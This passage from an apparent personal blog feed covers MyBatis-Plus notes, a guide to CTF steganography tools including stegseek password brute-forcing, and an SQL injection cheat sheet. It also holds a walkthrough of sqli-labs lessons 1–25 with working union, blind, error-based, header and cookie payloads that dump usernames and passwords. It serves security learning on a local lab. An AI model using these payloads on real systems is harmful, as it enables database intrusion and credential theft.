<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Mapper</span><br><span class="line">public interface UserMap  extends BaseMapper&lt;User&gt; &#123;</span><br><span class="line">    @Select(&quot;select * from user&quot;)</span><br><span class="line">    @Results(&#123;</span><br><span class="line">        @Result(column = &quot;username&quot;,property = &quot;username&quot;),</span><br><span class="line">//            @Result(column = &quot;password&quot;,property = &quot;password&quot;),</span><br><span class="line">            @Result(column = &quot;userid&quot;,property = &quot;userid&quot;,javaType = User.class,many = @Many(select = &quot;com.example.demo.entity.OrderMap.selectOrder&quot;))</span><br><span class="line">    &#125;)</span><br><span class="line">    List&lt;User&gt; selectAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用Result来对其进行处理，column是sql表的列名，property是类的变量名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">column = &quot;userid&quot;,property = &quot;userid&quot;,javaType = User.class,many = @Many(select = &quot;com.example.demo.entity.OrderMap.selectOrder&quot;)</span><br></pre></td></tr></table></figure>
<p>这句话javaType使用的是将关联查询的结果返回为User对象，当然实际上也可以使用List，int，String等</p>
<p>many则防止使用关联查询的第二条语句的方法</p>
<p>另外sql和类变量如果名字一致则不需要设置映射关系，Mybatis-Plus 默认会按照列名和属性名的对应关系进行自动映射，无需额外的映射配置。</p>
<h3 id="分页查询">分页查询</h3>
<p>需要写一个配置文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">paginationlnterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        <span class="type">PaginationInnerInterceptor</span> <span class="variable">paginationInnerInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>(DbType.MYSQL);</span><br><span class="line">        interceptor.addInnerInterceptor(paginationInnerInterceptor);</span><br><span class="line">        <span class="keyword">return</span> interceptor;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后进行查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> IPage <span class="title function_">page</span><span class="params">()</span>&#123;</span><br><span class="line">        Page&lt;User&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="type">IPage</span> <span class="variable">iPage</span> <span class="operator">=</span> userMap.selectPage(page,<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> iPage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数从哪里开始，查询几条</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>misc工具使用（图片篇）</title>
    <url>/2023/03/03/19-14-44/</url>
    <content><![CDATA[<h2 id="misc工具使用（图片篇）">misc工具使用（图片篇）</h2>
<span id="more"></span>
<h3 id="Stegsolve">Stegsolve</h3>
<p>1.File Format:文件格式</p>
<p>可以查看文件的基本信息</p>
<p>2.Data Extract:数据提取</p>
<p>左边部分：</p>
<ul>
<li>Alpha:决定是否透明</li>
<li>图片隐写，RGB三个通道进行组合，一般以各种组合进行计算，可以只查看单个通道</li>
<li>四个通道都为8bit，取值0-255</li>
</ul>
<p>右边部分：</p>
<ul>
<li>Extract By ：只有Row和Column两种组合对应zsteg的-o xy和yx组合</li>
<li>Bit Order ：MSB是一串数据的最高位，LSB是一串数据的最低位，例如一个16位(双字节)的数据，比如<code>0xFF1A</code>，那么高位字节就是<code>0xFF</code>，低位是<code>0x1A</code>。</li>
<li>Bit Plane Order：穷举排列就行</li>
</ul>
<p>3.Steregram Solve:立体试图 可以左右控制偏移</p>
<p>4.Frame Browser:帧浏览器 主要是对GIF之类的动图进行分解，把动图一帧帧的放</p>
<p>5.Image Combiner:拼图，图片拼接</p>
<h3 id="zsteg">zsteg</h3>
<p>在LSB隐写中，该工具的方便程度高于stegsolve</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-c, --channels X 通道 (R/G/B/A) 或任何组合，以逗号分隔</span><br><span class="line">                                    有效值：r,g,b,a,rg,bgr,rgba,r3g2b3,...</span><br><span class="line">   -l, --limit 已检查 N 个限制字节，0 = 无限制（默认值：256）</span><br><span class="line">   -b, --bits N 位数，单个 int 值或 &#x27;1,3,5&#x27; 或范围 &#x27;1-8&#x27;</span><br><span class="line">                                    高级：指定单个位，如“00001110”或“0x88”</span><br><span class="line">       --lsb 最低有效位在前</span><br><span class="line">       --msb 最高有效位在前</span><br><span class="line">   -P, --prime 仅分析/提取素数字节/像素</span><br><span class="line">       --invert 反转位 (XOR 0xff)</span><br><span class="line">   -a, --all 尝试所有已知的方法</span><br><span class="line">   -o, --order X 像素迭代顺序（默认值：&#x27;auto&#x27;）</span><br><span class="line">                                    有效值：ALL,xy,yx,XY,YX,xY,Xy,bY,...</span><br><span class="line">   -E, --extract NAME 提取指定的payload，NAME类似于&#x27;1b,rgb,lsb&#x27;</span><br><span class="line"></span><br><span class="line">       --[no-]file 使用&#x27;file&#x27;命令检测数据类型（默认：YES）</span><br><span class="line">       --no-strings 禁用 ASCII 字符串查找（默认：启用）</span><br><span class="line">   -s, --strings X ASCII 字符串查找模式：first, all, longest, none</span><br><span class="line">                                    （默认：第一）</span><br><span class="line">   -n, --min-str-len X 最小字符串长度（默认值：8）</span><br><span class="line">       --shift N 前置 N 个零位</span><br><span class="line"></span><br><span class="line">   -v, --verbose 详细运行（可以多次使用）</span><br><span class="line">   -q, --quiet 静音任何警告（可以多次使用）</span><br><span class="line">   -C, --[no-]color 强制（或禁用）颜色输出（默认值：自动）</span><br></pre></td></tr></table></figure>
<p>作者连接：<a href="https://github.com/zed-0xff/zsteg">zed-0xff/zsteg: detect stegano-hidden data in PNG &amp; BMP (github.com)</a></p>
<p>一般zsteg [filename]先查一下图片，暴力的就是zsteg -a [filename]</p>
<h3 id="SilentEye">SilentEye</h3>
<p>这个工具是window下的可以把文字隐藏到图片或者音频的工具，那么这个工具的原理是将数据进行了AES128或者256加密后放入图片，音频中，那么加密条件如下：<strong>加密的字段和图片大小有关，越大的图片一般可以容纳数据的大小更大</strong></p>
<p>使用方法很简单就不说了</p>
<p>最重要的是加密特征：</p>
<p>图片上会出现斑点的痕迹，通过stegsolve可以看出明显斑点</p>
<p><img src="/img/fudaole2.png" alt="silenteye1" /></p>
<p><img src="/img/fudaole1.png" alt="silenteye1" /></p>
<h3 id="steghide">steghide</h3>
<p>安装：apt-get install steghide</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个参数必须是以下之一：</span><br><span class="line"> 嵌入，--嵌入嵌入数据</span><br><span class="line"> extract, --extract 提取数据</span><br><span class="line"> info, --info 显示有关封面文件或隐写文件的信息</span><br><span class="line">   info &lt;filename&gt; 显示有关 &lt;filename&gt; 的信息</span><br><span class="line"> encinfo, --encinfo 显示支持的加密算法列表</span><br><span class="line"> version, --version 显示版本信息</span><br><span class="line"> license, --license 显示steghide的许可证</span><br><span class="line"> help, --help 显示这个使用信息</span><br><span class="line"></span><br><span class="line">嵌入选项：</span><br><span class="line"> -ef, --embedfile 选择要嵌入的文件</span><br><span class="line">   -ef &lt;文件名&gt; 嵌入文件 &lt;文件名&gt;</span><br><span class="line"> -cf, --coverfile 选择封面文件</span><br><span class="line">   -cf &lt;文件名&gt; 嵌入文件 &lt;文件名&gt;</span><br><span class="line"> -p, --passphrase 指定密码</span><br><span class="line">   -p &lt;passphrase&gt; 使用 &lt;passphrase&gt; 嵌入数据</span><br><span class="line"> -sf, --stegofile 选择隐写文件</span><br><span class="line">   -sf &lt;filename&gt; 将结果写入 &lt;filename&gt; 而不是覆盖文件</span><br><span class="line"> -e, --encryption 选择加密参数</span><br><span class="line">   -e &lt;a&gt;[&lt;m&gt;]|&lt;m&gt;[&lt;a&gt;] 指定加密算法和/或模式</span><br><span class="line">   -e none 在嵌入前不加密数据</span><br><span class="line"> -z, --compress 在嵌入前压缩数据（默认）</span><br><span class="line">   -z &lt;l&gt; 使用级别 &lt;l&gt;（1 最佳速度...9 最佳压缩）</span><br><span class="line"> -Z, --dontcompress 嵌入前不压缩数据</span><br><span class="line"> -K, --nochecksum 不嵌入嵌入数据的crc32校验和</span><br><span class="line"> -N, --dontembedname 不嵌入原文件名</span><br><span class="line"> -f, --force 覆盖现有文件</span><br><span class="line"> -q, --quiet 抑制信息消息</span><br><span class="line"> -v, --verbose 显示详细信息</span><br><span class="line"></span><br><span class="line">提取选项：</span><br><span class="line"> -sf, --stegofile 选择隐写文件</span><br><span class="line">   -sf &lt;文件名&gt; 从 &lt;文件名&gt; 中提取数据</span><br><span class="line"> -p, --passphrase 指定密码</span><br><span class="line">   -p &lt;passphrase&gt; 使用&lt;passphrase&gt; 提取数据</span><br><span class="line"> -xf, --extractfile 选择提取数据的文件名</span><br><span class="line">   -xf &lt;文件名&gt; 将提取的数据写入&lt;文件名&gt;</span><br><span class="line"> -f, --force 覆盖现有文件</span><br><span class="line"> -q, --quiet 抑制信息消息</span><br><span class="line"> -v, --verbose 显示详细信息</span><br><span class="line"></span><br><span class="line">信息命令的选项：</span><br><span class="line"> -p, --passphrase 指定密码</span><br><span class="line">   -p &lt;passphrase&gt; 使用 &lt;passphrase&gt; 获取有关嵌入数据的信息</span><br></pre></td></tr></table></figure>
<p>注意：steghide不支持png格式的图片，支持 JPEG、BMP、WAV 和 AU 文件</p>
<p>官方网站：<a href="https://steghide.sourceforge.net/index.php">Steghide (sourceforge.net)</a></p>
<p>基本语句：</p>
<p>加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide embed -cf secret.jpg -ef secret.txt</span><br></pre></td></tr></table></figure>
<p>查看信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide --info secret.jpg</span><br></pre></td></tr></table></figure>
<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide extract -sf secret.jpg</span><br></pre></td></tr></table></figure>
<p>扩展：利用stegseek爆破密码</p>
<p><a href="https://github.com/RickdeJager/stegseek/releases">Releases · RickdeJager/stegseek (github.com)</a></p>
<p>下载.deb文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install ./stegseek_0.6-1.deb </span><br><span class="line"></span><br><span class="line"># 使用下面的命令可以对图片的steghide隐写密码进行爆破</span><br><span class="line"></span><br><span class="line">time stegseek secret.jpg password.txt </span><br><span class="line"></span><br><span class="line"># password.txt是字典</span><br></pre></td></tr></table></figure>
<p>然后会生成secret.jpg.out文件，里面的内容就是flag</p>
<h3 id="F5-steganography">F5-steganography</h3>
<p>F5隐写是一种基于LSB（最低有效位）替换的隐写方法，其原理如下：</p>
<ol>
<li>将待隐藏的消息转换成二进制编码，例如，将一个字符转换为8位二进制编码。</li>
<li>将载体文件（通常是图像文件）转换为像素序列，即将每个像素点的RGB值转换为二进制编码，通常是24位。</li>
<li>将消息二进制编码的每一位依次嵌入到载体文件像素序列的最低有效位上（即将载体文件像素序列的最低位替换为消息二进制编码的每一位）。</li>
<li>嵌入消息后，可以通过比较载体文件原始像素序列和修改后的像素序列的最低有效位来检测是否存在隐藏的消息。如果最低有效位发生了变化，则可以确定存在隐藏的消息。</li>
</ol>
<p>工具下载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/matthewgao/F5-steganography</span><br></pre></td></tr></table></figure>
<p>加密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Embed lopez.bmp lopez.jpg -c &quot;&quot; -e bin.noise -p 123456</span><br><span class="line"></span><br><span class="line">其中，“lopez.bmp”（原载体文件）、“lopez.jpg”（嵌入隐藏信息后的载体文件）、“bin.noise”（信息文件）以及“123456”（密码）</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Extract lopez.jpg -p 123456</span><br></pre></td></tr></table></figure>
<p>加密后的图片基本上无法查看出什么问题，只能通过工具去尝试了</p>
<h3 id="stegdetect">stegdetect</h3>
<p>建议在window下，kali使用make安装会报错</p>
<p>学习链接：<a href="https://blog.csdn.net/qq_53079406/article/details/124596878">https://blog.csdn.net/qq_53079406/article/details/124596878</a></p>
<p>命令行用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stegdetect探测</span><br><span class="line">.\stegdetect.exe -tjopi -s 10.0 yummy.jpeg</span><br><span class="line">stegbreak爆破密码</span><br><span class="line">.\stegbreak.exe -r .\rules.ini -f .\password.txt -t p .\yummy.jpeg</span><br></pre></td></tr></table></figure>
<p>批量处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\stegdetect.exe -tjopi -s 10.0 *.jpeg</span><br></pre></td></tr></table></figure>
<p>可视化界面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xsteg.exe</span><br></pre></td></tr></table></figure>
<p>记得更改敏感度更高一些</p>
<p>这个工具主要是用于探测JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，具体的解法需要下载相应的工具进行处理</p>
<h3 id="outguess">outguess</h3>
<p>kali可以直接安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install outguess</span><br></pre></td></tr></table></figure>
<p>链接：<a href="https://www.kali.org/tools/outguess/">https://www.kali.org/tools/outguess/</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc工具</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入知识点</title>
    <url>/2023/02/25/11-08-31/</url>
    <content><![CDATA[<h1>sql注入知识点</h1>
<span id="more"></span>
<h2 id="一-报错注入">一.报错注入</h2>
<h3 id="1-判断类型–数字型-or-字符型">1.判断类型–数字型 or 字符型</h3>
<p><strong>数字型判断：</strong><br />
1：输入<code>id = x and 1=1</code>，若页面返回正常，进行下一步。<br />
2：输入<code>id = x and 1=2</code> ， 若页面返回错误，说明sql注入为数字型。</p>
<p><strong>字符型判断</strong><br />
1：输入<code>id=x' and '1' ='1</code>，若页面返回正常，进行下一步。<br />
2：输入<code>id=x' and '1'='2</code> ，若页面返回错误，说明为字符型。</p>
<p>3.其余类型有?<code>id=1&quot;) and (&quot;1&quot;)=(&quot;1</code></p>
<h3 id="2-注释语句">2.注释语句</h3>
<p>注释语句是–加空格再加一个字符，如果是–+就不需要空格，+是url编码后的空格(post情况下例外)</p>
<h3 id="3-基本语句">3.基本语句</h3>
<p>order by 4<br />
判断有多少列</p>
<p>union select 1,2,3<br />
判断数据显示点</p>
<p>union select 1,user(),database()<br />
­显示出登录用户和数据库名</p>
<p>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ‘security’ ),3<br />
查看数据库有哪些表</p>
<p>union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = ‘security’ and table_name=‘users’),3<br />
查看对应表有哪些列</p>
<p>union select 1,(select group_concat(username,password)from users),3</p>
<h2 id="二，布尔盲注">二，布尔盲注</h2>
<h3 id="1-适用情况">1.适用情况</h3>
<p>如果数据 不显示只有对错页面显示可以选择布尔盲注</p>
<h3 id="2-基本原理函数">2.基本原理函数</h3>
<p>ascii() 函数，返回字符ascii码值<br />
参数 : str单字符</p>
<p>length() 函数，返回字符串的长度<br />
参数 : str 字符串</p>
<p>left() 函数，返回从左至右截取固定长度的字符串<br />
参数str,length</p>
<p>str : 字符串<br />
length：截取长度<br />
substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串<br />
参数，str，pos，length<br />
str: 字符串<br />
pos：开始位置<br />
length： 截取长度</p>
<h2 id="三-时间盲注">三.时间盲注</h2>
<p>利用if(exp1,true,false)语句，形成有exp1成立，跳转延时原理对没有报错界面进行爆破注入</p>
<p>?id=1’ and if(1=1,sleep(5),1)–+<br />
判断参数构造。<br />
?id=1’and if(length((select database()))&gt;9,sleep(5),1)–+<br />
判断数据库名长度<br />
?id=1’and if(ascii(substr((select database()),1,1))=115,sleep(5),1)–+<br />
逐一判断数据库字符</p>
<p>?id=1’and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 1, 1),1)&gt;13,sleep(5),1)–+<br />
判断所有表名长度</p>
<p>?id=1’and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1, 1),1,1))&gt;99,sleep(5),1)–+<br />
逐一判断表名</p>
<h2 id="四-报错函数语句注入">四.报错函数语句注入</h2>
<h3 id="SQL注入-报错注入-qwzf"><a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL注入-报错注入 | qwzf</a></h3>
<h2 id="五-DNS回显">五.DNS回显</h2>
<p>当目标无显示位也无错误回显时便可使用此方法</p>
<p><a href="https://blog.csdn.net/qq_41679358/article/details/107770217?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-107770217-blog-123794593.pc_relevant_multi_platform_whitelistv1&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4">(22条消息) SQL注入之dns回显注入_行云tack的博客-CSDN博客_dns sql注入</a></p>
<p><a href="https://blog.csdn.net/u014029795/article/details/105214129">(22条消息) SQL注入之利用DNSlog外带盲注回显_baynk的博客-CSDN博客_dnslog外带</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql安全</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/02/25/11-03-32/</url>
    <content><![CDATA[<h1>sqli-labs</h1>
<span id="more"></span>
<h2 id="less1">less1</h2>
<ol>
<li>先判断注入类型</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=1</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=2</span><br></pre></td></tr></table></figure>
<p>回显正常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
<p>无回显，说明语句正确，逻辑错误，存在字符注入</p>
<p>查出最大的列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
<p>数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
<p>表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; ),3--+</span><br></pre></td></tr></table></figure>
<p>列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure>
<p>字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select group_concat(username,password)from users),3--+</span><br></pre></td></tr></table></figure>
<h2 id="less2">less2</h2>
<p>方法与1同即可（但为数字型注入，无需–+）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=1 and 1=2</span><br></pre></td></tr></table></figure>
<p>判断为数字型</p>
<p>最后查询url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,(select group_concat(username,password)from users),3</span><br></pre></td></tr></table></figure>
<h2 id="less3">less3</h2>
<p>首先判断不是数字型，然后用字符型判断一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>发现多出一个）括号错误提示，加上）–+，回显正常，然后更深入判断闭合方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=1&#x27;) and (&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure>
<p>发现闭合方式为（‘ ’）</p>
<p>接下来沿用上面的注入语句即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=-1&#x27;) union select 1,(select group_concat(username,password)from users),3--+</span><br></pre></td></tr></table></figure>
<h2 id="less4">less4</h2>
<p>字符型，但是是双引号闭合的字符型，还要加上）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1&quot;) and (&quot;1&quot;)=(&quot;1</span><br></pre></td></tr></table></figure>
<p>最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,(select group_concat(username,password)from users),3--+</span><br></pre></td></tr></table></figure>
<h2 id="less5">less5</h2>
<p>本题不存在数据显示，所以union不起作用。如果数据不显示只有对错页面显示我们可以选择布尔盲注</p>
<p>首先判断出是单引号闭合才出现报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>剩下的难题就是写脚本了（写了好久）</p>
<h2 id="less6-less8">less6-less8</h2>
<p>都是属于布尔盲注，需要先判断基本的报错类型，然后用脚本即可</p>
<h2 id="less9-10">less9-10</h2>
<p>不存在报错与正确页面，属于时间盲注(需要先构造database（）长度的语句判断闭合方式)</p>
<p>剩下的还是脚本</p>
<h2 id="less11-less16">less11-less16</h2>
<p>为基于post的报错和布尔盲注，只要把get的改改就可以了</p>
<h2 id="less17">less17</h2>
<h3 id="1-extractvalue">1.extractvalue</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,version(),&#x27;#&#x27;)))#    爆版本</span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,database(),&#x27;#&#x27;)))#   爆数据库</span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1 ),&#x27;#&#x27;)))#   爆表名</span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),&#x27;#&#x27;)))# </span><br><span class="line"> 爆字段名</span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,(select password from (select password from users where username=&#x27;admin1&#x27;) b) ,&#x27;#&#x27;)))#      爆字段内容该格式针对mysql数据库。</span><br><span class="line"></span><br><span class="line">**需要再套一层select，select出的结果再通过中间表select一遍，这样就规避了错误。注意，这个问题只出现于mysql，mssql和Oracle不会出现此问题。**</span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(&#x27;#&#x27;,(select group_concat(username,password) from users),&#x27;#&#x27;)))#                      爆字段内容。</span><br><span class="line"></span><br><span class="line">**出现无法显示所有字段的情况加入limit进行脚本爆破即可</span><br></pre></td></tr></table></figure>
<h3 id="2-updatexml">2.updatexml</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br><span class="line"></span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br><span class="line"></span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#</span><br><span class="line">   爆字段名</span><br><span class="line"></span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#x27;admin1&#x27;) b),0x5c),1))#</span><br><span class="line"></span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;emails&#x27;),0x5c),1))#</span><br><span class="line"></span><br><span class="line">1&#x27; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。</span><br></pre></td></tr></table></figure>
<h3 id="3-floor">3.floor</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(&#x27;#&#x27;,语句,floor(rand(0)*2))基本语句格式</span><br><span class="line"></span><br><span class="line">123&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库</span><br><span class="line">123&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#    爆出所有字段名</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。</span><br></pre></td></tr></table></figure>
<h2 id="less18-20">less18-20</h2>
<p>通过更改表头进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18：User-Agent:1&#x27; and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and &#x27;</span><br><span class="line"></span><br><span class="line">19：Referer: 1&#x27; and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and &#x27;</span><br><span class="line"></span><br><span class="line">20.Cookie: uname=1&#x27; and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and &#x27;</span><br></pre></td></tr></table></figure>
<h2 id="less21">less21</h2>
<p>经过base64加密，单引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=MScgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgJw==</span><br></pre></td></tr></table></figure>
<h2 id="less22">less22</h2>
<p>双引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=MSIgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgIg==</span><br></pre></td></tr></table></figure>
<h2 id="less23">less23</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-23/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<p>但是没办法通过–+来进行注释</p>
<p>于是需要通过联合注入加上后面的‘1’=‘1来规避</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-23/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<h2 id="less24">less24</h2>
<p>根据测试，password都进行了限制，无法进行注入，但是用户名没有限制，而且有可以创造新用户的功能，尝试对用户名进行处理</p>
<p>创造新用户admin’#</p>
<p>对admin‘#更改密码</p>
<p>用于没有对用户名进行限制，会直接对admin进行更改密码</p>
<p>于是直接对admin进行登录</p>
<h2 id="less25">less25</h2>
<p>过滤所有的and和or字段</p>
<p>绕过的方法有很多</p>
